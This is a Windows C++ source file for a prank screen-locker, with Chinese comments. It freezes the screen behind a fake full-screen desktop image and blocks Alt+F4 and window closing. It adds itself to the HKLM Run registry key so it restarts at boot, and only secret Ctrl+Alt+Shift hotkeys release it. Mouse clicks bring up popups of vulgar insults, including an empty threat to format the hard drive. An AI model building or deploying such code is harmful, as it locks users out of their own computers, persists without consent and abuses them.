//#ifndef UNICODE 
//#define tstring string
//#else
//#define tstring wstring
//#endif
#include<Windows.h>
#include<string>
#include<ctime>
#include"resource.h"
using namespace std;
//#ifndef UNICODE 
//typedef  string tstring;
//#else
//typedef  wstring tstring;
//#endif
#ifndef UNICODE //如果没有定义UNICODE ,用tstring替换为string,否则替换为wstring
using  tstring = string;
#else
using  tstring = wstring;
#endif
static bool bFullScreen = false;//是否全屏
static RECT windowRect;//窗口的坐标，当窗口全屏时保存原窗口
static int cxScreen, cyScreen;//屏幕宽度、高度
static HWND hDestop;//桌面句柄
static HBITMAP hBitmap;//位图句柄
bool startBoot = true;
#define ID_HOTKEYCLIP 1
#define ID_HOTKEYDELETE 2

# define ID_FULL 2
TCHAR tip[5][MAX_PATH] =
{
	TEXT("傻逼，你点什么，别点了，点什么点，有什么好点的"),
	TEXT("逼逼，你还在点，不知道我说的是你吗，都叫你别点了，你还点"),
	TEXT("妈蛋，你再点也没用，屏幕我要独占，你想用电脑干吗，无非上网，看A片，低俗，我现在正操控电脑，你别乱点"),
	TEXT("我真它妈火了，你点呀，你有本事重开机，开机也没有，开机还会这样"),
	TEXT("你若再点鼠标，我就格式化硬盘，你信不信，哈，你说，这不是你的电脑？？？？")
};
int bit[5] = { IDB_BITMAP1, IDB_BITMAP2, IDB_BITMAP3, IDB_BITMAP4, IDB_BITMAP5 };
HBITMAP Bitmap[5];
void GetDestopBK(HWND hDestop, HBITMAP &hBitmap, int cxScreen, int cyScreen)//获得窗口背景，选入位图
{
	HDC hdcMem = CreateCompatibleDC(0);//获得与屏幕兼容的画笔
	HDC  hdcScr = GetDCEx(hDestop, 0,DCX_LOCKWINDOWUPDATE);//获得屏幕的画笔,即使屏幕锁住也能刷新
	hBitmap = CreateCompatibleBitmap(hdcScr, cxScreen,cyScreen);//创建与屏幕大小兼容的位图
	SelectObject(hdcMem, hBitmap);//将位图选入画笔
	BitBlt(hdcMem, 0, 0, cxScreen, cyScreen, hdcScr, 0, 0, SRCCOPY);//将屏幕的位图拷贝到内容上的位图
	DeleteDC(hdcMem);
	ReleaseDC(hDestop, hdcScr);
}
void ShowFullScreen(HWND hwnd, int cxScreen, int cyScreen)//让窗口全屏
{
	SetWindowLong(hwnd, GWL_STYLE, WS_POPUP);//设置窗口样式为弹出式窗口，就是去掉系统菜单、标题栏、边框等，也可用WS_BORDER样式
	SetMenu(hwnd, 0);//去掉菜单
	SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, cxScreen, cyScreen, SWP_SHOWWINDOW);//让窗口显示全屏，置顶
	bFullScreen = true;//是全屏
}
void RecoveryWindow(HWND hwnd, RECT windowRect)//恢复窗口原来的大小位置
{
	SetWindowLong(hwnd, GWL_STYLE, WS_OVERLAPPEDWINDOW);//恢复窗口样式
	SetWindowPos(hwnd, HWND_NOTOPMOST,44,44,444,444, SWP_SHOWWINDOW);//恢复原来位置
	bFullScreen = false;//不是全屏
}
void SetStartingUpBoot()//设置开机启动
{
	HKEY m_regkey;//注册表句柄
	TCHAR filename[MAX_PATH];
	GetModuleFileName(NULL, filename, MAX_PATH);//返回程序的全路径
	TCHAR lpRun[] = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");//子键路径
	long iRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &m_regkey);//打开自启动注册表键
	if (iRet == ERROR_SUCCESS)//打开成功
	{
		if (startBoot)
		RegSetValueEx(m_regkey, TEXT("全屏ZENG"), 0, REG_SZ, (const unsigned char *)filename, MAX_PATH);//将当前程序路径添加到注册表自启动中
		else
			RegDeleteValue(m_regkey, TEXT("全屏ZENG"));//删除注册表
	}
	RegCloseKey(m_regkey);//关闭注册表
}
int _stdcall DlgProc(HWND hwnd, unsigned int UMsg, unsigned int wParam, long lParam)
{
	HDC hdc;//画笔
	HDC hdcMem;
	PAINTSTRUCT ps;//画笔结构，保留画笔作息
	static  BITMAP bm;
	static int i;
	switch (UMsg)
	{
	case WM_INITDIALOG:
		i = rand() % 5;
		GetObject(Bitmap[i],sizeof(BITMAP), &bm);
		SetWindowText(GetDlgItem(hwnd,IDC_MYSTATIC), tip[i]);
		MoveWindow(hwnd,100+rand()%1000,50+rand()%600,bm.bmWidth,bm.bmHeight, true);
		SetTimer(hwnd, 1,800, 0);
		return false;
	case WM_SIZE:
		break;
	case WM_PAINT:
		hdc = BeginPaint(hwnd, &ps);//获得窗口画笔
		hdcMem = CreateCompatibleDC(hdc);
		SelectObject(hdcMem, Bitmap[i]);
		BitBlt(hdc, 0, 0,bm.bmWidth,bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
		DeleteDC(hdcMem);
		EndPaint(hwnd, &ps);//释放画笔资源
		break;
	case WM_TIMER:
		KillTimer(hwnd, 1);
		EndDialog(hwnd,0);
		break;
	}
	return false;
}
long _stdcall WndProc(HWND hwnd, unsigned int UMsg, unsigned int wParam, long lParam)//窗口过程
{
	PAINTSTRUCT ps;//画笔结构，保留画笔作息
	HDC hdc;//画笔
	static int cxClient, cyClient;//客户区宽度、高度
	static int cxChar, cyChar;//字母宽度、高度
	int wmId, wmEvent;//控件ID,控件通知码，则操作
	static HINSTANCE hInst;//窗口实例句柄
	static HDC hdcMem;//内存画笔
	NOTIFYICONDATA nid;
	switch (UMsg)
	{
	case WM_CREATE://窗口被创建
	   	hInst = (HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE);//获得窗口实例句柄
		cxChar = LOWORD(GetDialogBaseUnits());//得到对话框中字母的宽度
		cyChar = HIWORD(GetDialogBaseUnits());//得到对话框中字母的高度
		cxScreen = GetSystemMetrics(SM_CXSCREEN);//屏幕宽度、高度
		cyScreen = GetSystemMetrics(SM_CYSCREEN);
		for (int i = 0; i < 5; i++)
			Bitmap[i] = LoadBitmap(hInst, MAKEINTRESOURCE(bit[i]));
		srand(time(0));
		SetTimer(hwnd, 2, 2000, 0);
		SetStartingUpBoot();
		break;
	case WM_SIZE://窗口大小改变时
		cxClient = LOWORD(lParam);//更新客户区的大小
		cyClient = HIWORD(lParam);
		break;
	case WM_TIMER:
		ShowFullScreen(hwnd, cxScreen, cyScreen);//全屏显示
		InvalidateRect(hwnd, 0, true);//在窗口绘制桌面背景
		break;
	case WM_COMMAND://在子窗口、菜单上操作时产生命令
		wmId = LOWORD(wParam);//控件ID
		wmEvent = HIWORD(wParam);//控件通知码，则操作
		switch (wmId)
		{
		case ID_HOTKEYCLIP:
			SetStartingUpBoot();
			DestroyWindow(hwnd);
			PostQuitMessage(0);
			break;
		case ID_FULL:
			GetDestopBK(hDestop, hBitmap, cxScreen, cyScreen);//得到窗口位图
			ShowFullScreen(hwnd, cxScreen, cyScreen);//全屏显示
			InvalidateRect(hwnd, 0, true);//在窗口绘制桌面背景
			break;
		}
		break;
	case WM_PAINT://有区域失效，发生重绘
		hdc = BeginPaint(hwnd, &ps);//获得窗口画笔
		if (hBitmap)//位图不空
		{
			hdcMem = CreateCompatibleDC(0);//获得与屏幕兼容的画笔
			BITMAP bm;//位图结构
			GetObject(hBitmap, sizeof(BITMAP), &bm);//获得位图信息
			SelectObject(hdcMem,hBitmap);//将位图选入画笔
			BitBlt(hdc, 0, 0, cxScreen,cyScreen, hdcMem, 0, 0, SRCCOPY);//在窗口上显示截图
			DeleteObject(hdcMem);
		}
		EndPaint(hwnd, &ps);//释放画笔资源
		break;
	case WM_SYSKEYDOWN:
		if (wParam == VK_F4)//过滤ALT+F4关闭键
			return 0;
		break;
	case WM_LBUTTONDOWN:
		DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG1), hwnd, DlgProc);
		break;
	case WM_CLOSE://窗口关闭
		return 0;
	case WM_DESTROY://窗口销毁时
		PostQuitMessage(0);//抛出一条返回值为0退出消息
		break;
	}
	return DefWindowProc(hwnd, UMsg, wParam, lParam);//用默认的窗口过程处理其它消息，做些其它处理
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char *  szCmdCommand, int nCmdShow)
{
	WNDCLASS wndclass;//窗口类
	wndclass.cbClsExtra = 0;//为类分配的额外空间，可以保存一些地址、变量
	wndclass.cbWndExtra = 0;//为窗口分配的额外空间，可以保存一些地址、变量
	wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//背景画刷
	wndclass.hCursor = LoadCursor(nullptr, IDC_ARROW);//鼠标光标
	wndclass.hIcon = LoadIcon(hInstance,MAKEINTRESOURCE(IDI_ICON1));//图标
	wndclass.hInstance = hInstance;//实例名柄，程序的PID，一个整数，根据这个整数，系统可以找到进程的地址
	wndclass.lpfnWndProc = WndProc;//窗口过程
	wndclass.lpszClassName = TEXT("zeng");//类名
	wndclass.lpszMenuName = nullptr;//菜单
	wndclass.style = CS_VREDRAW | CS_HREDRAW;//哪些改变后要重画，设置水平和垂直改变后重绘
	if (!RegisterClass(&wndclass))//注册窗口类
	{
		MessageBox(nullptr, TEXT("register failed"), TEXT("error"), MB_ICONINFORMATION);
		return 0;
	}
	HWND hwnd = CreateWindow(TEXT("zeng"), TEXT(""),WS_POPUP,
		-50,-50,0,0,
		nullptr, nullptr, hInstance, nullptr);//创建窗口
	if (!hwnd)
	{
		MessageBox(nullptr, TEXT("create window failed"), TEXT("error"), MB_ICONASTERISK);
	}
	RegisterHotKey(0, ID_HOTKEYCLIP, MOD_CONTROL | MOD_ALT|MOD_SHIFT, 'E');//截图热键
	RegisterHotKey(0, ID_HOTKEYDELETE, MOD_CONTROL | MOD_ALT | MOD_SHIFT, 'D');//截图热键
	ShowWindow(hwnd, nCmdShow);//显示窗口
	UpdateWindow(hwnd);//进行重绘
	SendMessage(hwnd, WM_COMMAND, ID_FULL, 0);
	MSG msg;//消息结构
	while (GetMessage(&msg, nullptr, 0, 0))//从消息队列获取消息
	{
		if (msg.message == WM_HOTKEY)//如果是系统热键
		{
			if (msg.wParam==ID_HOTKEYCLIP)
			    SendMessage(hwnd, WM_COMMAND, ID_HOTKEYCLIP, 0);
			if (msg.wParam == ID_HOTKEYDELETE)
				startBoot = false;
		}
		TranslateMessage(&msg);//将一些按键消息转换成字符消息放在按键消息后面
		DispatchMessage(&msg);//分发消息，即调用窗口过程进行处理消息
	}
}